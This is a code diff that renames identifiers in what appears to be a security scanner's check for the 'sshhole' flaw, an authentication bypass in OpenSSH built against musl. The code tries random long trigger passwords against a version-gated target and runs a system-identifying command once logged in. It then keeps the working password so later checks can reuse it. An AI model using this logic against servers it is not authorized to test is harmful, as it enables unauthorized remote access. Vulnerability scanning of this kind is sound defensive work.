@@ -15,7 +15,7 @@ import (
 	"github.com/runZeroInc/sshamble/auth"
 )
 
-const checkVulnMuslCryptStar = "vuln-musl-crypt-star"
+const checkVulnSSHHole = "vuln-sshhole"
 
 // OpenSSH sshd built against musl libc without PAM accepts any password of
 // 257 to 1024 bytes for a valid user whose shadow field is "*" (sshhole, no
@@ -39,31 +39,31 @@ const checkVulnMuslCryptStar = "vuln-musl-crypt-star"
 //
 // https://sshhole.com/
 
-const muslCryptStarControlLen = 256
+const sshholeControlLen = 256
 
-var muslCryptStarTriggerLens = []int{257, 1024}
+var sshholeTriggerLens = []int{257, 1024}
 
-// muslCryptStarAuthTries is how often the cached credential sends the trigger
+// sshholeAuthTries is how often the cached credential sends the trigger
 // password on one connection: once to prime pick_salt() and once to match "*".
-const muslCryptStarAuthTries = 2
+const sshholeAuthTries = 2
 
-const muslCryptStarProofCommand = "id; uname -a; ls /lib/ld-musl-* 2>/dev/null; head -3 /etc/os-release 2>/dev/null"
+const sshholeProofCommand = "id; uname -a; ls /lib/ld-musl-* 2>/dev/null; head -3 /etc/os-release 2>/dev/null"
 
-// muslCryptStarFixedVersion is the first OpenSSH release that rejects short
+// sshholeFixedVersion is the first OpenSSH release that rejects short
 // password hashes; earlier releases are probed.
-var muslCryptStarFixedVersion = [3]int{10, 6, 2}
+var sshholeFixedVersion = [3]int{10, 6, 2}
 
-// muslCryptStarVersionPattern matches an OpenSSH banner and captures the
+// sshholeVersionPattern matches an OpenSSH banner and captures the
 // major, minor, and portable patch components.
-var muslCryptStarVersionPattern = regexp.MustCompile(`^SSH-(?:2\.0|1\.99)-OpenSSH_(\d+)(?:\.(\d+))?(?:p(\d+))?`)
+var sshholeVersionPattern = regexp.MustCompile(`^SSH-(?:2\.0|1\.99)-OpenSSH_(\d+)(?:\.(\d+))?(?:p(\d+))?`)
 
-var errMuslCryptStarControlAccepted = errors.New("control password accepted")
+var errSSHHoleControlAccepted = errors.New("control password accepted")
 
-// muslCryptStarVersion parses an OpenSSH server banner into major/minor/patch
+// sshholeVersion parses an OpenSSH server banner into major/minor/patch
 // components. Non-OpenSSH banners and banners without a version number
 // return false.
-func muslCryptStarVersion(version string) ([3]int, bool) {
-	m := muslCryptStarVersionPattern.FindStringSubmatch(version)
+func sshholeVersion(version string) ([3]int, bool) {
+	m := sshholeVersionPattern.FindStringSubmatch(version)
 	if m == nil {
 		return [3]int{}, false
 	}
@@ -81,88 +81,88 @@ func muslCryptStarVersion(version string) ([3]int, bool) {
 	return out, true
 }
 
-// muslCryptStarVulnerableVersion reports whether the banner is an OpenSSH
+// sshholeVulnerableVersion reports whether the banner is an OpenSSH
 // release older than the one that rejects short password hashes.
-func muslCryptStarVulnerableVersion(version string) bool {
-	v, ok := muslCryptStarVersion(version)
+func sshholeVulnerableVersion(version string) bool {
+	v, ok := sshholeVersion(version)
 	if !ok {
 		return false
 	}
 	for i := range 3 {
-		if v[i] != muslCryptStarFixedVersion[i] {
-			return v[i] < muslCryptStarFixedVersion[i]
+		if v[i] != sshholeFixedVersion[i] {
+			return v[i] < sshholeFixedVersion[i]
 		}
 	}
 	return false
 }
 
-// muslCryptStarRandomPassword returns a random password of exactly n bytes
+// sshholeRandomPassword returns a random password of exactly n bytes
 // with no NUL bytes, since sshd measures passwords with strlen().
-func muslCryptStarRandomPassword(n int) string {
+func sshholeRandomPassword(n int) string {
 	buff := make([]byte, n)
 	_, _ = rand.Read(buff)
 	return base64.RawURLEncoding.EncodeToString(buff)[:n]
 }
 
-// muslCryptStarPasswords returns the control password followed by the
+// sshholePasswords returns the control password followed by the
 // trigger passwords.
-func muslCryptStarPasswords() []string {
-	pws := []string{muslCryptStarRandomPassword(muslCryptStarControlLen)}
-	for _, n := range muslCryptStarTriggerLens {
-		pws = append(pws, muslCryptStarRandomPassword(n))
+func sshholePasswords() []string {
+	pws := []string{sshholeRandomPassword(sshholeControlLen)}
+	for _, n := range sshholeTriggerLens {
+		pws = append(pws, sshholeRandomPassword(n))
 	}
 	return pws
 }
 
-// muslCryptStarAccepted reports whether the server accepted the password,
+// sshholeAccepted reports whether the server accepted the password,
 // including a partial success where the server still wants another method.
-func muslCryptStarAccepted(r ssh.ExpAuthResult) bool {
+func sshholeAccepted(r ssh.ExpAuthResult) bool {
 	return r == ssh.AuthResultSuccess || r == ssh.AuthResultPartialSuccess
 }
 
-// muslCryptStarMaxAuthTries reports whether the server ended the connection
+// sshholeMaxAuthTries reports whether the server ended the connection
 // because the attempt reached MaxAuthTries, which counts as a rejection.
-func muslCryptStarMaxAuthTries(err error) bool {
+func sshholeMaxAuthTries(err error) bool {
 	return err != nil && strings.Contains(strings.ToLower(err.Error()), "too many authentication failures")
 }
 
-// muslCryptStarClassify decides whether a run of password attempts (control
+// sshholeClassify decides whether a run of password attempts (control
 // first, then triggers in order) shows the bypass. It returns the index of
 // the accepted trigger password, or -1 and the reason the run does not count.
-func muslCryptStarClassify(results []ssh.ExpAuthResult) (int, string) {
+func sshholeClassify(results []ssh.ExpAuthResult) (int, string) {
 	if len(results) == 0 {
 		return -1, "no password attempt completed"
 	}
-	if muslCryptStarAccepted(results[0]) {
-		return -1, fmt.Sprintf("the %d-byte control password was accepted, so the server accepts any password", muslCryptStarControlLen)
+	if sshholeAccepted(results[0]) {
+		return -1, fmt.Sprintf("the %d-byte control password was accepted, so the server accepts any password", sshholeControlLen)
 	}
 	for i := 1; i < len(results); i++ {
-		if muslCryptStarAccepted(results[i]) {
+		if sshholeAccepted(results[i]) {
 			return i, ""
 		}
 	}
-	if len(results) < 1+len(muslCryptStarTriggerLens) {
-		return -1, fmt.Sprintf("disconnected after %d of %d password attempts were rejected", len(results), 1+len(muslCryptStarTriggerLens))
+	if len(results) < 1+len(sshholeTriggerLens) {
+		return -1, fmt.Sprintf("disconnected after %d of %d password attempts were rejected", len(results), 1+len(sshholeTriggerLens))
 	}
 	return -1, "every trigger password was rejected"
 }
 
-// muslCryptStarAuthMethod returns a password method that resends the trigger
+// sshholeAuthMethod returns a password method that resends the trigger
 // password on the same connection. attempts, when set, counts the sends.
-func muslCryptStarAuthMethod(password string, attempts *int) ssh.AuthMethod {
+func sshholeAuthMethod(password string, attempts *int) ssh.AuthMethod {
 	cb := ssh.PasswordCallback(func() (string, error) {
 		if attempts != nil {
 			*attempts++
 		}
 		return password, nil
 	})
-	return ssh.RetryableAuthMethod(cb, muslCryptStarAuthTries)
+	return ssh.RetryableAuthMethod(cb, sshholeAuthTries)
 }
 
-// muslCryptStarExecRan reports whether an exec request completed on the
+// sshholeExecRan reports whether an exec request completed on the
 // session. A remote exit status (zero or not) and a channel that closed
 // without sending one both mean the command was accepted and ran.
-func muslCryptStarExecRan(err error) (string, bool) {
+func sshholeExecRan(err error) (string, bool) {
 	if err == nil {
 		return "0", true
 	}
@@ -175,13 +175,13 @@ func muslCryptStarExecRan(err error) (string, bool) {
 	return "", false
 }
 
-// muslCryptStarSessionHandler runs the proof command on the opened session.
-func muslCryptStarSessionHandler(options *auth.Options) auth.SessionHandler {
+// sshholeSessionHandler runs the proof command on the opened session.
+func sshholeSessionHandler(options *auth.Options) auth.SessionHandler {
 	return func(c net.Conn, sclient *ssh.Client, ses *ssh.Session, res *auth.AuthResult) error {
 		_ = c.SetDeadline(time.Now().Add(options.Timeout * 3))
-		out, err := ses.CombinedOutput(muslCryptStarProofCommand)
+		out, err := ses.CombinedOutput(sshholeProofCommand)
 		res.SessionOutput = auth.CleanSessionOutput(out)
-		status, ran := muslCryptStarExecRan(err)
+		status, ran := sshholeExecRan(err)
 		if !ran {
 			return err
 		}
@@ -190,22 +190,22 @@ func muslCryptStarSessionHandler(options *auth.Options) auth.SessionHandler {
 	}
 }
 
-func sshCheckVulnMuslCryptStar(addr string, conf *ScanConfig, options *auth.Options, root *auth.AuthResult) *auth.AuthResult {
-	tname := checkVulnMuslCryptStar
+func sshCheckVulnSSHHole(addr string, conf *ScanConfig, options *auth.Options, root *auth.AuthResult) *auth.AuthResult {
+	tname := checkVulnSSHHole
 	if !conf.IsCheckEnabled(tname) {
 		return nil
 	}
 	if !root.SupportsAuth("password") {
 		return nil
 	}
-	if !muslCryptStarVulnerableVersion(root.Version) {
+	if !sshholeVulnerableVersion(root.Version) {
 		conf.Logger.Debugf("%s %s skipped: server version %q is not a vulnerable OpenSSH release", addr, tname, root.Version)
 		return nil
 	}
 
 	conf.Logger.Debugf("%s %s is running for user %s", addr, tname, options.Username)
 
-	passwords := muslCryptStarPasswords()
+	passwords := sshholePasswords()
 	var results []ssh.ExpAuthResult
 
 	// Send the control and trigger passwords on one connection, stopping at the first accepted one.
@@ -214,7 +214,7 @@ func sshCheckVulnMuslCryptStar(addr string, conf *ScanConfig, options *auth.Opti
 		for i, pw := range passwords {
 			ares, methods, err := uac.Authenticate(ssh.Password(pw), extensions)
 			if err != nil {
-				if muslCryptStarMaxAuthTries(err) {
+				if sshholeMaxAuthTries(err) {
 					results = append(results, ssh.AuthResultFailure)
 				}
 				return err
@@ -222,11 +222,11 @@ func sshCheckVulnMuslCryptStar(addr string, conf *ScanConfig, options *auth.Opti
 			results = append(results, ares)
 			res.Result = ares.String()
 			res.Methods = methods
-			if !muslCryptStarAccepted(ares) {
+			if !sshholeAccepted(ares) {
 				continue
 			}
 			if i == 0 {
-				return errMuslCryptStarControlAccepted
+				return errSSHHoleControlAccepted
 			}
 			if ares != ssh.AuthResultSuccess {
 				return fmt.Errorf("authentication incomplete: %s", ares)
@@ -236,9 +236,9 @@ func sshCheckVulnMuslCryptStar(addr string, conf *ScanConfig, options *auth.Opti
 		return fmt.Errorf("authentication failed: %s", res.Result)
 	}
 
-	res := auth.SSHAuth(addr, options.WithSessionHandler(muslCryptStarSessionHandler(options)), handler)
+	res := auth.SSHAuth(addr, options.WithSessionHandler(sshholeSessionHandler(options)), handler)
 
-	idx, reason := muslCryptStarClassify(results)
+	idx, reason := sshholeClassify(results)
 	if idx < 0 {
 		// OpenSSH 9.8+ PerSourcePenalties refuses a source after repeated failed logins.
 		if strings.Contains(res.Error, "Not allowed at this time") {
@@ -254,15 +254,15 @@ func sshCheckVulnMuslCryptStar(addr string, conf *ScanConfig, options *auth.Opti
 	// connection, since interact and the session checks re-authenticate with
 	// SessionAuth and nothing else.
 	attempts := 0
-	again := auth.SSHAuth(addr, options.WithSessionHandler(muslCryptStarSessionHandler(options)), auth.SSHAuthHandlerSingle(muslCryptStarAuthMethod(trigger, &attempts)))
+	again := auth.SSHAuth(addr, options.WithSessionHandler(sshholeSessionHandler(options)), auth.SSHAuthHandlerSingle(sshholeAuthMethod(trigger, &attempts)))
 	reusable := again.Stage == "session"
 
 	conf.Logger.Warnf("%s %s accepted a %d-byte random password for user %s", addr, tname, len(trigger), options.Username)
 
 	proof := fmt.Sprintf("%s accepted a %d-byte random password for user %s (%s) after rejecting a %d-byte control password on the same connection.",
-		res.Version, len(trigger), options.Username, results[idx], muslCryptStarControlLen)
+		res.Version, len(trigger), options.Username, results[idx], sshholeControlLen)
 	if res.Stage == "session" && res.Error == "" {
-		proof += fmt.Sprintf(" Output of %q: %s", muslCryptStarProofCommand, res.SessionOutput)
+		proof += fmt.Sprintf(" Output of %q: %s", sshholeProofCommand, res.SessionOutput)
 	} else {
 		proof += fmt.Sprintf(" No command ran on that connection (stage %s: %s).", res.Stage, res.Error)
 	}
@@ -291,6 +291,6 @@ func sshCheckVulnMuslCryptStar(addr string, conf *ScanConfig, options *auth.Opti
 	res.SessionMethod = tname
 	root.SessionMethod = tname
 	root.SessionSecret = trigger
-	root.SessionAuth = muslCryptStarAuthMethod(trigger, nil)
+	root.SessionAuth = sshholeAuthMethod(trigger, nil)
 	return res
 }
